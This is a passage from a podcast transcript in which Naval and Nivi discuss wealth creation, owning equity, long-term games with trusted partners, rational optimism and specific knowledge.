pretty nice. And then there\u2019s this other one from Jeffrey Pfeffer, who is a professor at Stanford that, \u201cyou can\u2019t be normal and expect abnormal returns.\u201d I\u2019ve always enjoyed that one too. Naval: Yeah. And one quote that I like which is the exact opposite of that is, \u201cplay stupid games win stupid prizes.\u201d A lot of people spend a lot of their time playing social games like on Twitter where you\u2019re trying to improve your social standing and you basically win stupid social prizes which are worthless. Nivi: I guess the last thing that I have from this blog post is the idea that by pursuing these kinds of luck especially the last one, basically everything but dumb luck, by pursuing them you essentially run out of unluck. So, if you just keep stirring the pot and stirring the pot, that alone you will run out of unluck. Naval: Yeah, or it could just be reversion to the mean. So, then you at least neutralized luck so that it\u2019s your own talents that come into play. You Won\u2019t Get Rich Renting Out Your Time You can\u2019t earn non-linearly when you\u2019re renting out your time You won\u2019t get rich renting out your time Nivi: Next you go into more specific details on how you can actually get rich, and how you can\u2019t get rich. The first point was about how you\u2019re not going to get rich: \u201cYou are not going to get rich renting out your time. You must own equity, a piece of the business to gain your financial freedom.\u201d Naval: This is probably one of the absolute most important points. People seem to think that you can create wealth, and make money through work. And it\u2019s probably not going to work. There are many reasons for that. But the most basic is just that your inputs are very closely tied to your outputs. In almost any salaried job, even at one that\u2019s paying a lot per hour like a lawyer, or a doctor, you\u2019re still putting in the hours, and every hour you get paid. So, what that means is when you\u2019re sleeping, you\u2019re not earning. When you\u2019re retired, you\u2019re not earning. When you\u2019re on vacation, you\u2019re not earning. And you can\u2019t earn non-linearly. If you look at even doctors who get rich, like really rich, it\u2019s because they open a business. They open like a private practice. And that private practice builds a brand, and that brand attracts people. Or they build some kind of a medical device, or a procedure, or a process with an intellectual property. So, essentially you\u2019re working for somebody else, and that person is taking on the risk, and has the accountability, and the intellectual property, and the brand. So, they\u2019re just not gonna pay you enough. They\u2019re gonna pay you the bare minimum that they have to, to get you to do their job. And that can be a high bare minimum, but it\u2019s still not gonna be true wealth where you\u2019re retired. Renting out your time means you\u2019re essentially replaceable And then finally you\u2019re actually just not even creating that much original for society. Like I said, this tweetstorm should have been called \u201cHow to Create Wealth.\u201d It\u2019s just \u201cHow to Get Rich\u201d was a more catchy title. But you\u2019re not creating new things for society. You\u2019re just doing things over and over. And you\u2019re essentially replaceable because you\u2019re now doing a set role. Most set roles can be taught. If they can be taught like in a school, then eventually you\u2019re gonna be competing with someone who\u2019s got more recent knowledge, who\u2019s been taught, and is coming in to replace you. You\u2019re much more likely to be doing a job that can be eventually replaced by a robot, or by an AI. And it doesn\u2019t even have to be wholesale replaced over night. It can be replaced a little bit at a time. And that kind of eats into your wealth creation, and therefore your earning capability. So, fundamentally your inputs are matched to your outputs. You are replaceable, and you\u2019re not being creative. I just don\u2019t think that, that is a way that you can truly make money. You must own equity to gain your financial freedom So everybody who really makes money at some point owns a piece of a product, or a business, or some kind of IP. That can be through stock options, so you can be working at a tech company. That\u2019s a fine way to start. But usually the real wealth is created by starting your own companies, or by even investors. They\u2019re in an investment firm, and they\u2019re buying equity. These are much more the routes to wealth. It doesn\u2019t come through the hours. You want a career where your inputs don\u2019t match your outputs You really just want a job, or a career, or a profession where your inputs don\u2019t match your outputs. If you look at modern society, again this is later in the tweetstorm. Businesses that have high creativity and high leverage tends to be ones where you could do an hour of work, and it can have a huge effect. Or you can do 1,000 hours of work, and it can have no effect. For example, look at software engineering. One great engineer can for example create bitcoin, and create billions of dollars worth of value. And an engineer who is working on the wrong thing, or not quite as good, or just not as creative, or thoughtful, or whatever, can work for an entire a year, and every piece of code they ship ends up not getting used. Customers don\u2019t want it. That is an example of a profession where the input and the outputs are highly disconnected. It\u2019s not based on the number of hours that you put in. Whereas on the extreme other end, if you\u2019re a lumberjack, even the best lumberjack in the world, assuming you\u2019re not working with tools, so the inputs and outputs are clearly connected. You\u2019re just using an ax, or a saw. You know, the best lumberjack in the world may be like 3x better than one of the worst lumberjacks, right? It\u2019s not gonna be a gigantic difference. So, you want to look for professions and careers where the inputs and outputs are highly disconnected. This is another way of saying that you want to look for things that are leveraged. And by leveraged I don\u2019t mean financial leveraged alone, like Wall Street uses, and that has a bad name. I\u2019m just talking about tools. We\u2019re using tools. A computer is a tool that software engineers use. If I\u2019m a lumberjack with bulldozers, and automatic robot axes, and saws, I\u2019m gonna be using tools, and have more leverage than someone who is just using his bare hands, and trying to rip the trees out by the roots. Tools and leverage are what create this disconnection between inputs and outputs. Creativity, so the higher the creativity component of a profession, the more likely it is to have disconnected inputs and outputs. So, I think that if you\u2019re looking at professions where your inputs and your outputs are highly connected, it\u2019s gonna be very, very, hard to create wealth, and make wealth for yourself in that process. Live Below Your Means for Freedom People busy upgrading their lifestyles just can\u2019t fathom this freedom People living below their means have freedom Nivi: Any other big things you should avoid, other than renting out your time? Naval: Yeah, there are two tweets that I put out that are related. The first one I was talking about where someone, like, how your lifestyle has to upgrade, shouldn\u2019t get upgraded too fast. And that one basically said, people who are living far below their means enjoy a freedom that people busy upgrading their lifestyles just can\u2019t fathom. And I think that\u2019s very important, just to not upgrade your lifestyle all the time. To maintain your freedom. And it just gives you freedom of operation. You basically, once you make a little bit of money, you still want to be living like your old self, so that just the worry goes away. So, don\u2019t run out to upgrade that house, and lifestyle, and all that stuff. The most dangerous things are heroin and a monthly salary Let\u2019s say you\u2019re getting paid $1,000 an hour. The problem is, is that when you go into a work lifestyle like that, you don\u2019t just suddenly go from making $20 an hour to making $1,000 an hour. That\u2019s a progression over a long career. And as that happens, one subtle problem is that you upgrade your lifestyle as you make more, and more money. And that upgrading of the lifestyle kind of ups what you consider to be wealth, and you stay in this wage slave trap. So, I forget who said it, maybe it was Nassim Taleb. But he said, \u201cThe most dangerous things are heroin, and a monthly salary.\u201d Right, because they are highly addictive. The way you want to get wealthy is you want to be poor, and working, and working, and working. Ideally, you\u2019ll make your money in discrete lumps And this is for example how the tech industry works. Where you don\u2019t make any money for ten years, and then suddenly at year eleven, you might have a giant payday. Which is by the way one reason why these very high marginal tax rates for the so-called wealthy are flawed because the highest risk-taking, most creative professions you literally lose money for a decade over your life, while you take massive risk, and you bleed, and bleed, and bleed. And then suddenly in year eleven, or year fifteen, you might have one single big payday. But then of course Uncle Sam show up, and basically say, \u201cHey, you know what, you just made a lot money this year. Therefore, you\u2019re rich. Therefore, you\u2019re evil and you\u2019ve got to hand it all over to us.\u201d So, it just destroys those kinds of creative risk taking professions. But ideally you want to make your money in discrete lumps, separated over long periods of time, so that your own lifestyle does not have a chance to adapt quickly, and then you basically say, \u201cOkay, now I\u2019m done. Now I\u2019m retired. Now I\u2019m free. I\u2019m still gonna work because you got to do something with your life, but I\u2019m gonna work on only the things that I want, when I want.\u201d And so you have much more creative expression, and much less about money. Give Society What It Doesn\u2019t Know How to Get Society will pay you for creating what it wants and delivering it at scale Give society what it wants, but doesn\u2019t know how to get\u2014at scale Nivi: You\u2019re not gonna get rich renting out your time. But you say that, \u201cyou will get rich by giving society what it wants, but does not yet know how to get at scale.\u201d Naval: That\u2019s right. So, essentially as we talked about before, money is IOUs from society saying, \u201cYou did something good in the past. Now here\u2019s something that we owe you for the future.\u201d And so society will pay you for creating things that it wants. But society doesn\u2019t yet know how to create those things because if it did, they wouldn\u2019t need you. They would already be stamped out big time. Almost everything that\u2019s in your house, in your workplace, and on the street used to be technology at one point in time. There was a time when oil was a technology, that made J.D. Rockefeller rich. There was a time when cars were technology, that made Henry Ford rich. So, technology is just the set of things, as Alan Kay said, that don\u2019t quite work yet [correction: Danny Hillis]. Once something works, it\u2019s no longer technology. So, society always wants new things. Figure out what product you can provide and then figure out how to scale it And if you want to be wealthy, you want to figure out which one of those things you can provide for society, that it does not yet know how to get, but it will want, that\u2019s natural to you, and within your skillset, within your capabilities. And then you have to figure out how to scale it. Because if you just build one of it, that\u2019s not enough. You\u2019ve got to build thousands, or hundreds of thousands, or millions, or billions of them. So, everybody can have one. Steve Jobs, and his team of course figured out that society would want smartphones. A computer in their pocket that had all the phone capability times 100, and be easy to use. So, they figured out how to build that, and then they figured out how to scale it. And they figured out how to get one into every First World citizen\u2019s pocket, and eventually every Third World citizen too. And so because of that they\u2019re handsomely rewarded, and Apple is the most valuable company in the world. Nivi: The way I tried to put it was that the entrepreneur\u2019s job is to try to bring the high end to the mass market. Naval: It starts as high end. First it starts as an act of creativity. First you create it just because you want it. You want it, and you know how to build it, and you need it. And so you build it for yourself. Then you figure out how to get it to other people. And then for a little while rich people have it. Like, for example rich people had chauffeurs, and then they had black town cars. And then Uber came along, and everyone\u2019s private driver is available to everybody. And now you can even see Uber pools that are replacing shuttle buses because it\u2019s more convenient. And then you get scooters, which are even further down market of that. So, you\u2019re right. It\u2019s about distributing what rich people used to have to everybody. But the entrepreneur\u2019s job starts even before that, which is creation. Entrepreneurship is essentially an act of creating something new from scratch. Predicting that society will want it, and then figuring out how to scale it, and get it to everybody in a profitable way, in a self-sustaining way. The Internet Has Massively Broadened Career Possibilities The Internet allows you to scale any niche obsession The Internet has massively broadened the possible space of careers Nivi: Let\u2019s look at this next tweet, which I thought was cryptic, and also super interesting, about the kind of job or career that you might have. You said, \u201cThe internet has massively broadened the possible space of careers. Most people haven\u2019t figured this out yet.\u201d Naval: The fundamental property of the internet more than any other single thing is it connects every human to each other human on the planet. You can now reach everyone. Whether it\u2019s by emailing them personally, whether it\u2019s by broadcasting to them on Twitter, whether it\u2019s by posting something on Facebook that they find, whether it\u2019s by putting up a website they come and access. It connects everyone to everyone. So, the internet is an inter-networking tool. It connects everybody. That is its superpower. So, you want to use that. What that helps you figure out is the internet means you can find your audience for your product, or your talent, and skill no matter how far away they are. For example, Nenad, who is Illacertus , if you look at his videos pre-internet, how would he get the message out there? It would just be \u2026 what would he do? He would run around where he lives in his neighborhood showing it to people on a computer, or a screen? Or he would try to get it played at his local movie theater? It was impossible. It only works because he can put it on the internet. And then how many people in the world are really interested in it? Or even in interested in what we\u2019re talking about are really gonna absorb it, right? It\u2019s gonna be a very small subset of humanity. The key is being able to reach them. The Internet allows you to scale any niche obsession So, what the internet does is allows any niche obsession, which could be just the weirdest thing. It could be like people who collect snakes, to like people who like to ride hot air balloons, to people who like to sail around the world by themselves, just one person on a craft, or someone who\u2019s obsessed with miniature cooking. Like, there\u2019s this whole Japanese miniature cooking phenomenon. Or there\u2019s a show about a woman who goes in people\u2019s houses, and tidies it up, right? So, whatever niche obsession you have, the internet allows you to scale. Now that\u2019s not to say that what you build will be the next Facebook, or reach billions of users, but if you just want to reach 50,000 passionate people like you, there\u2019s an audience out there for you. So the beauty of this is that we have 7 billion human beings on the planet. The combinatorics of human DNA are incredible. Everyone is completely different. You\u2019ll never meet any two people who are even vaguely similar to each other, that can substitute for each other. It\u2019s not like you can say, \u201cWell, Nivi, just left my life. So, I can have this other person come in, and he\u2019s just like Nivi. And I get the same feelings, and the same responses, and the same ideas.\u201d No. There are no substitutes for people. People are completely unique. So, given that each person has different skillsets, different interests, different obsessions. And it\u2019s that diversity that becomes a creative superpower. So, each person can be creatively superb at their own unique thing. But before that didn\u2019t matter. Because if you were living in a little fishing village in Italy, like your fishing village didn\u2019t necessarily need your completely unique skill, and you had to conform to just the few jobs that were available. But now today you can be completely unique. You can go out on the internet, and you can find your audience. And you can build a business, and create a product, and build wealth, and make people happy just uniquely expressing yourself through the internet. The space of careers has been so broadened. E-sports players, you know, people making millions of dollars playing Fortnite. People creating videos, and uploading them. YouTube broadcasters. Bloggers, podcasters. Joe Rogan, I read, true or false, I don\u2019t know, but I read that he\u2019s gonna make about $100 million a year on his podcast. And he\u2019s had 2 billion downloads. Even PewDiePie\u2026 there\u2019s a hilarious tweet that I retweeted the other day. PewDiePie is the number one trusted name in news. This is a kid I think in Sweden, and he\u2019s got three times the distribution of the top cable news networks. Just on his news channel. It\u2019s not even on his entertainment channel. Escape competition through authenticity The internet enables any niche interest, as long as you\u2019re the best at it to scale out. And the great news is because every human is different, everyone is the best at something. Being themselves. Another tweet I had that is worth kind of weaving in, but didn\u2019t go into this tweetstorm, was a very simple one. I like things when I can compress them down because they\u2019re easy to remember, and easy to hook onto. But that one was, \u201cEscape competition through authenticity.\u201d Basically, when you\u2019re competing with people it\u2019s because you\u2019re copying them. It\u2019s because you\u2019re trying to do the same thing. But every human is different. Don\u2019t copy. I know we\u2019re mimetic creatures, and Ren\u00e9 Girard has a whole mimesis theory. But it\u2019s much easier than that. Don\u2019t imitate. Don\u2019t copy. Just do your own thing. No one can compete with you on being you. It\u2019s that simple. And so the more authentic you are to who you are, and what you love to do, the less competition you\u2019re gonna have. So, you can escape competition through authenticity when you realize that no one can compete with you on being you. And normally that would have been useless advice pre-internet. Post-internet you can turn that into a career. Play Long-Term Games With Long-Term People All returns in life come from compound interest in long-term games Play long-term games with long-term people Nivi: Talk a little bit about what industries you should think about working in. What kind of job you should have? And who you might want to work with? So, you said, \u201cOne should pick an industry where you can play long-term games with long-term people.\u201d Why? Naval: Yeah, this is an insight into what makes Silicon Valley work, and what makes high trust societies work. Essentially, all the benefits in life come from compound interests. Whether it\u2019s in relationships, or making money, or in learning. So, compound interest is a marvelous force, where if you start out with 1x what you have, and then if you increase 20% a year for 30 years, it\u2019s not that you got 30 years times 20% added on. It was compounding, so it just grew, and grew, and grew until you suddenly got a massive amount of whatever it is. Whether it\u2019s goodwill, or love, or relationships, or money. So, I think compound interest is a very important force. You have to be able to play a long-term game. And long-term games are good not just for compound interest, they\u2019re also good for trust. If you look at prisoner\u2019s dilemma type games, a solution to prisoner\u2019s dilemma is tit-for-tat, which is I\u2019m just going do to you what you did last time to me, with some forgiveness in case there was a mistake made. But that only works in an iterated prisoner\u2019s dilemma, in another words if we play a game multiple times. So, if you\u2019re in a situation, like for example you\u2019re in Silicon Valley, where people are doing business with each other, and they know each other, they trust each other. Then they do right by each other because they know this person will be around for the next game. Now of course that doesn\u2019t always work because you can make so much money in one move in Silicon Valley, sometimes people betray each other because they\u2019re just like, \u201cI\u2019m going to get rich enough off this that I don\u2019t care.\u201d So, there can be exceptions to all these circumstances. But essentially if you want to be successful, you have to work with other people. And you have to figure out who can you trust, and who can you trust over a long, long period of time, that you can just keep playing the game with them, so that compound interest, and high trust will make it easier to play the game, and will let you collect the major rewards, which are usually at the end of the cycle. So, for example, Warren Buffett has done really well as an investor in the U.S. stock market, but the biggest reason he could do that was because the U.S. stock market has been stable, and around, and didn\u2019t get for example seized by the government during a bad administration. Or the U.S. didn\u2019t plunge into some war. The underlying platform didn\u2019t get destroyed. So, in his case, he was playing a longterm game. And the trust came from the U.S. stock market\u2019s stability. When you switch industries, you\u2019re starting over from scratch In Silicon Valley, the trust comes from the network of people in the small geographic area, that you figure out over time who you can work with, and who you can\u2019t. If you keep switching locations, you keep switching groups\u2026 let\u2019s say you started out in the woodworking industry, and you built up a network there. And you\u2019re working hard, you\u2019re trying to build a product in the woodworking industry. And then suddenly another industry comes along that\u2019s adjacent but different, but you don\u2019t really know anybody in it, and you want to dive in, and make money there. If you keep hopping from industry to \u2026 \u201cNo, actually I need to open a line of electric car stations for electric car refueling.\u201d That might make sense. That might be the best opportunity. But every time you reset, every time you wander out of where you built your network, you\u2019re going to be starting from scratch. You\u2019re not going to know who to trust. They\u2019re not going to know to trust you. There are also industries in which people are transient by definition. They\u2019re always coming in and going out. Politics is an example of that, right? In politics new people are being elected. You see in politics that when you have a lot of old-timers, like the Senate, people who have been around for a long time, and they\u2019ve been career politicians. There\u2019s a lot of downside to career politicians like corruption. But an upside is they actually get deals done with each other because they know the other person is going to be in the same position ten years from now, and they\u2019re going to have to keep dealing with them, so they might as well learn how to cooperate. Whereas every time you get a new incoming freshman class in the House of Representatives, which turns over every two years with a big wave election. Nothing gets done because of a lot fighting. \u201cBecause I just got here, I don\u2019t know you, I don\u2019t know if you\u2019re going to be around, why should I work with you rather than just try to do whatever I think is right?\u201d So, it\u2019s important to pick an industry where you can play long-term games, and with long-term people. So, those people have to signal that they\u2019re going to be around for a long time. That they\u2019re ethical. And their ethics are visible through their actions. Long-term players make each other rich Nivi: In a long-term game, it seems that everybody is making each other rich. And in a short-term game, it seems like everybody is making themselves rich. Naval: I think that is a brilliant formulation. In a longterm game, it\u2019s positive sum. We\u2019re all baking the pie together. We\u2019re trying to make it as big as possible. And in a short term game, we\u2019re cutting up the pie. Now this is not to excuse the socialists, right? The socialists are the people who are not involved in baking the pie, who show up at the end, and say, \u201cI want a slice, or I want the whole pie.\u201d They show up with the guns. But I think a good leader doesn\u2019t take credit. A good leader basically tries to inspire people, so the team gets the job done. And then things get divided up according to fairness, and who contributed how much, or as close to it as possible, and took a risk, as opposed to just whoever has the longest knife\u2026 the sharpest knife at the end. Returns come from compound interest in iterated games Nivi: So, these next two tweets are, \u201cPlay iterated games. All returns in life, whether in wealth, relationships, or knowledge come from compound interest.\u201d Naval: When you have been doing business with somebody, you\u2019ve been friends with somebody for ten years, twenty years, thirty years, it just gets better and better because you trust them so easily. The friction goes down, you can do bigger, and bigger things together. For example, the simplest one is getting married to someone, and having kids, and raising children. That\u2019s compound interest, right? Investing in those relationships. Those relationships end up being invaluable compared to more casual relationships. It\u2019s true in health and fitness. You know, the fitter you are, the easier it is to stay fit. Whereas the more you deteriorate your body, the harder it is to come back, and claw your way back to a baseline. It requires heroic acts. Nivi: Regarding compound interest, I think I saw retweet something a while back. Maybe it was from Ed Latimore. It went something along the lines of, \u201cGet some traction. Get purchase, and don\u2019t lose it\u201d [correction: the tweet is by @ mmay3r ]. So, the idea was to gain some initial traction, and never fall back, just keep ratcheting up, and up. Naval: I don\u2019t remember it exactly. But I think that was right. Yes, it was like, \u201cGet traction, and don\u2019t let go.\u201d It was a good one, yes. Pick Partners With Intelligence, Energy and Integrity You can\u2019t compromise on any of these three Pick business partners with high intelligence, energy and integrity Naval: In terms of picking people to work with, pick ones that have high intelligence, high energy, and high integrity, I find that\u2019s the three-part checklist that you cannot compromise on. You need someone who is smart, or they\u2019ll head in the wrong direction. And you\u2019re not going to end up in the right place. You need someone high-energy because the world is full of smart, lazy people. We all know people in our life who are really smart, but can\u2019t get out of bed, or lift a finger. And we also know people who are very high energy, but not that smart. So, they work hard, but they\u2019re sort of running in the wrong direction. And smart is not a pejorative. It\u2019s not meant to say someone is smart, someone else is stupid. But it\u2019s more that everyone is smart at different things. So, depending on what you want to do well, you have to find someone who is smart at that thing. And then energy, a lot of times people are unmotivated for a specific thing, but they\u2019re motivated for other things. So, for example, someone might be really unmotivated to go to a job, and sit in an office. But they might be really motivated to go paint, right? Well, in that case they should be a painter. They should be putting art up on the internet. Trying to figure out how to build a career out of that, rather than wearing a collar around their neck, and going to a dreary job. And then high integrity is the most important because otherwise if you\u2019ve got the other two, what you have is you have a smart and hard working crook, who\u2019s eventually going to cheat you. So, you have to figure out if the person is high-integrity. And as we talked about, the way you do that is through signals. And signals is what they do, not what they say. It\u2019s all the non-verbal stuff that they do when they think nobody is looking. Motivation has to come intrinsically Nivi: With respect to the energy, there was this interesting thing from Sam Altman a while back, where he was talking about delegation, and he was saying, \u201cOne of the important things for delegation is, delegate to people who are actually good at the thing that you want them to do.\u201d It\u2019s the most obvious thing, but it seems like\u2026 you want to partner with people who are naturally going to do the things that you want them to do. Naval: Yeah. I almost won\u2019t start a company, or hire a person, or work with somebody if I just don\u2019t think they\u2019re into what I want them to do. When I was younger, I used to try and talk people into things. I had this idea that you could sell someone into doing something. But you can\u2019t. You can\u2019t keep them motivated. You can get them inspired initially. It might work if you\u2019re a king like Henry V, and you\u2019re trying to get them to just charge into battle, and then they\u2019ll figure it out. But if you\u2019re trying to keep someone motivated for the long-term, that motivation has to come intrinsically. You can\u2019t just create it, nor can you be the crutch for them if they don\u2019t have that intrinsic motivation. So, you have to make sure people actually are high-energy, and want to do what you want them to do, and what you want to work with them on. Integrity is what someone does, despite what they say they do Reading signals is very, very important. Signals are what people do despite what they say. So, it\u2019s important to pay attention to subtle signals. We all know that socially if someone treats a waiter, or waitress in a restaurant really badly, then it\u2019s only a matter of time until they treat you badly. If somebody screws over an enemy, and is vindictive towards them, well it\u2019s only a matter of time before they redefine you from friend to enemy, and you feel their wrath. So, angry, outraged, vindictive, short-term thinking people are essentially that way in many interactions in real life. People are oddly consistent. That\u2019s one of the things you learn about them. So, you want to find long-term people. You want to find people who seem irrationally ethical. For example, I had a friend of mine whose company I invested in, and the company failed, and he could have wiped out all of the investors. But he kept putting more and more personal money in. Through three different pivots he put personal money in until the company finally succeeded. And in the process, he never wiped out the investors. And I was always grateful to him for that. I said, \u201cWow, that\u2019s amazing that you were so good to your investors. You didn\u2019t wipe them out.\u201d And he got offended by that. He said, \u201cI didn\u2019t do it for you. I didn\u2019t do it for my investors. I did it for me. It\u2019s my own self-esteem. It\u2019s what I care about. That\u2019s how I live my life.\u201d That\u2019s the kind of person you want to work with. Another quote that I like, I have a tweet on this. I think I read this somewhere else, so I\u2019m not taking credit for this. But I kind of modified it a little bit. Which is that \u201cself-esteem is the reputation that you have with yourself.\u201d You\u2019ll always know. So, good people, moral people, ethical people, easy to work with people, reliable people, tend to have very high self-esteem because they have very good reputations with themselves, and they understand that. It\u2019s not ego. Self-esteem and ego are different things. Because ego can be undeserved, but self-esteem at least you feel like you lived up to your own internal moral code of ethics. And so it\u2019s very hard to work with people who end up being low integrity. And it\u2019s hard to figure out who is high integrity and low integrity. Generally, the more someone is saying that they\u2019re moral, ethical, and high integrity, the less likely they are to be that way. It\u2019s very much like status signalling. If you overtly bid for status, if you overtly talk about being high status, that is a low status move. If you openly talk about how honest, reliable, and trustworthy you are, you\u2019re probably not that honest and trustworthy. That is a characteristic of con men. So, yeah, pick an industry in which you can play long-term games with long-term people. Partner With Rational Optimists Don\u2019t partner with cynics and pessimists; their beliefs are self-fulfilling Don\u2019t partner with pessimists Nivi: Let\u2019s do this last tweet. You said, \u201cDon\u2019t partner with cynics, and pessimists. Their beliefs are self-fulfilling.\u201d Naval: Yes. Essentially, to create things, you have to be a rational optimist. Rational in the sense that you have to see the world for what it really is. And yet you have to be optimistic about your own capabilities, and your capability to get things done. We all know people who are consistently pessimistic, who will shoot down everything. Everyone in their life has the helpful critical guy, right? He thinks he\u2019s being helpful, but he\u2019s actually being critical, and he\u2019s a downer on everything. That person will not only never do anything great in their lives, they\u2019ll prevent other people around them from doing something great. They think their job is to shoot holes in things. And it\u2019s okay to shoot holes in things as long as you come up with a solution. There\u2019s also the classic military line, \u201cEither lead, follow, or get out of the way.\u201d And these people want a fourth option, where they don\u2019t want to lead, they don\u2019t want to follow, but they don\u2019t want to get out of the way. They want to tell you why the thing is not going to work. And all the really successful people I know have a very strong action bias. They just do things. The easiest way to figure out if something is viable or not is by doing it. At least do the first step, and the second step, and the third, and then decide. So, if you want to be successful in life, creating wealth, or having good relationships, or being fit, or even being happy, you need to have an action bias towards getting what you want. Partner with rational optimists And you have to be optimistic about it. Not irrationally. You know, there\u2019s nothing worse than someone who is foolhardy and chasing something that\u2019s not worth it. That\u2019s why I say rational optimist. But you have to be rational. Know all the pitfalls. Know the downsides, but still keep your chin up. You\u2019ve got one life on this planet. Why not try to build something big? This is the beauty of Elon Musk, and why I think he inspires so many people, it\u2019s just because he takes on really, really big audacious tasks. And he provides an example for people to think big. And it takes a lot of work to build even small things. I don\u2019t think the corner grocery store owner is working any less hard than Elon Musk, or pouring any less sweat and toil into it. Maybe even more. But for whatever reason, education, circumstance, they didn\u2019t get the chance to think as big, so the outcome is not as big. So, it\u2019s just better to think big. Obviously, rationally, within your means, stay optimistic. The cynics and the pessimists, what they\u2019re really saying, it\u2019s unfortunate, but they\u2019re basically saying, \u201cI\u2019ve given up. I don\u2019t think I can do anything. And so the world to me just looks like a world where nobody can do anything. And so why should you go do something because if you fail, then I\u2019m right, which is great. But if you succeed, then you just make me look bad.\u201d We descended from pessimists Nivi: Yes, it\u2019s probably better to be an irrational optimist, then it is to be a rational cynic. Naval: There\u2019s a completely rational frame on why you should be an optimist. Historically, if you go back 2,000 years, 5,000 years, 10,000 years, two people are wandering through a jungle, they hear a tiger. One\u2019s an optimist, and says, \u201cOh, it\u2019s not headed our way.\u201d The other one says, \u201cI\u2019m a pessimist, I\u2019m out of here.\u201d And the pessimist runs and survives, and the optimist gets eaten. So, we\u2019re descended from pessimists. We\u2019re genetically hardwired to be pessimists. But modern society is far, far safer. There are no tigers wandering around the street. It\u2019s very unlikely that you will end up in total ruin, although you should avoid total ruin. Much more likely that the upside is unlimited, and the downside is limited. So, adapting for modern society means overriding your pessimism, and taking slightly irrationally optimistic bets because the upside is unlimited if you start the next SpaceX, or Tesla, or Uber, you can make billions of dollars of value for society, and for yourself, and change the world. And if you fail, what\u2019s the big deal? You lost a few million dollars of investor money, and they\u2019ve got plenty more, and that\u2019s the bet they take on the chances that you will succeed. It made sense to be pessimistic in the past. It makes sense to be optimistic today, especially if you\u2019re educated and living in a First World country. Even a Third World country. I actually think the economic opportunities in Third World countries are much larger. The one thing you have to avoid is the risk of ruin. Ruin means stay out of jail. So, don\u2019t do anything that\u2019s illegal. It\u2019s never worth it to wear an orange jumpsuit. And stay out of total catastrophic loss. That could mean that you stay out of things that could be physically dangerous, hurt your body. You have to watch your health. And stay out of things that can cause you to lose all of your capital, all of your savings. So, don\u2019t gamble everything on one go. But take rationally optimistic bets with big upside. BOCTAOE Nivi: I think there\u2019s people that will try and build up your ideas, and build on your ideas, no matter how far fetched they might seem. And then there are people who list all of the obvious exceptions, no matter how obvious they are. And fortunately in the startup world, I don\u2019t even really get exposed to the people that are giving you the obvious exceptions, and all the reasons it\u2019s not going to work. I barely get exposed to that anymore. Naval: That\u2019s what Twitter is for. Scott Adams got so annoyed by this that he came up with a phrase, an acronym, which is \u201cbut of course there are obvious exceptions\u201d, BOCTAOE. And he used to pin that acronym at the end of his articles for a while. But Twitter is overrun with nitpickers. Whereas exactly as you were pointing out, Silicon Valley has learned that the upside is so great that you never look down on the kid who\u2019s wearing a hoodie and has coffee on his shoes. And just looks like a slob because you don\u2019t know if he\u2019s going to be the next Mark Zuckerberg, or the next Reid Hoffman. So, you\u2019ve got to treat everybody with respect. You\u2019ve got to look up to every possibility, and opportunity because the upside is so unlimited, and the downside is so limited in the modern world, especially with financial assets and instruments. Arm Yourself With Specific Knowledge Specific knowledge can be found by pursuing your genuine curiosity Arm yourself with specific knowledge Nivi: Do you want to talk a little bit about the skills that you need, in particular specific knowledge, accountability, leverage and judgment. So, the first tweet in this area is \u201cArm yourself with specific knowledge accountability and leverage.\u201d And I\u2019ll throw in judgment as well. I don\u2019t think you covered that in that particular tweet. Naval: If you want to make money you have to get paid at scale. And why you, that\u2019s accountability, at scale, that\u2019s leverage, and just you getting paid as opposed to somebody else getting paid , that\u2019s specific knowledge. So, specific knowledge is probably the hardest thing to get across in this whole tweetstorm, and it\u2019s probably the thing that people get the most confused about. The thing is that we have this idea that everything can be taught, everything can be taught in school. And it\u2019s not true that everything can be taught. In fact, the most interesting things cannot be taught. But everything can be learned. And very often that learning either comes from some innate characteristics in your DNA, or it could be through your childhood where you learn soft skills which are very, very hard to teach later on in life, or it\u2019s something that is brand new so nobody else knows how to do it either, or it\u2019s true on the job training because you\u2019re pattern matching into highly complex environments, basically building judgment in a specific domain. Classic example is investing, but it could be in anything. It could be in judgment in running a fleet of trucks, it could be judgment in weather forecasting. So, specific knowledge is the knowledge that you care about. Especially if you\u2019re later in life, let\u2019s say your post 20, 21, 22, you almost don\u2019t get to choose which specific knowledge you have. Rather, you get to look at what you have already built by that point in time, and then you can build on top of it. Specific knowledge can\u2019t be trained The first thing to notice about specific knowledge is that you can\u2019t be trained for it. If you can be trained for it, if you can go to a class and learn specific knowledge, then somebody else can be trained for it too, and then we can mass-produce and mass-train people. Heck, we can even program computers to do it and eventually we can program robots to walk around doing it. So, if that\u2019s the case, then you\u2019re extremely replaceable and all we have to pay you is the minimum wage that we have to pay you to get you to do it when there are lots of other takers who can be trained to do it. So really, your returns just devolve into your cost of training plus the return on investment on that training. So, you really want to pick up specific knowledge, you need your schooling, you need your training to be able to capitalize on the best specific knowledge, but the part of it that you\u2019re going to get paid for is the specific knowledge. Specific knowledge is found by pursuing your curiosity For example, someone who goes and gets a degree in psychology and then becomes a salesperson. Well if they were already a formidable salesperson, a high grade salesmanship to begin with, then the psychology degree is leverage, it arms them and they do much better at sales. But if they were always an introvert never very good at sales and they\u2019re trying to use psychology to learn sales, they\u2019re just not going to get that great at it. So, specific knowledge is found much more by pursuing your innate talents, your genuine curiosity, and your passion. It\u2019s not by going to school for whatever is the hottest job, it\u2019s not for going into whatever field investors say is the hottest. Very often specific knowledge is at the edge of knowledge. It\u2019s also stuff that\u2019s just being figured out or is really hard to figure out. So, if you\u2019re not 100% into it somebody else who is 100% into it will outperform you. And they won\u2019t just outperform you by a little bit, they\u2019ll outperform you by a lot because now we\u2019re operating the domain of ideas, compound interest really applies and leverage really applies. So, if you\u2019re operating with 1,000 times leverage and somebody is right 80% of the time, and somebody else is right 90% of time, the person who\u2019s right 90% of the time will literally get paid hundreds of times more by the market because of the leverage and because of the compounding factors and being correct. So, you really want to make sure you\u2019re good at it so that genuine curiosity is very important. Building specific knowledge will feel like play to you So, very often, it\u2019s not something you sit down and then you reason about, it\u2019s more found by observation. You almost have to look back on your own life and see what you\u2019re actually good at. For example, I wanted to be a scientist and that is where a lot of my moral hierarchy comes from. I view scientists sort of at the top of the production chain for humanity. And the group of scientists who have made real breakthroughs and contributions that probably added more to human society, I think, than any single other class of human beings. Not to take away anything from art or politics or engineering or business, but without the science we\u2019d still be scrambling in the dirt fighting with sticks and trying to start fires. My whole value system was built around scientists and I wanted to be a great scientist. But when I actually look back at what I was uniquely good at and what I ended up spending my time doing, it was more around making money, tinkering with technology, and selling people on things. Explaining things, talking to people. So, I have some sales skills, which is a form specific knowledge that I have. I have some analytical skills around how to make money. And I have this ability to absorb data, obsess about it, 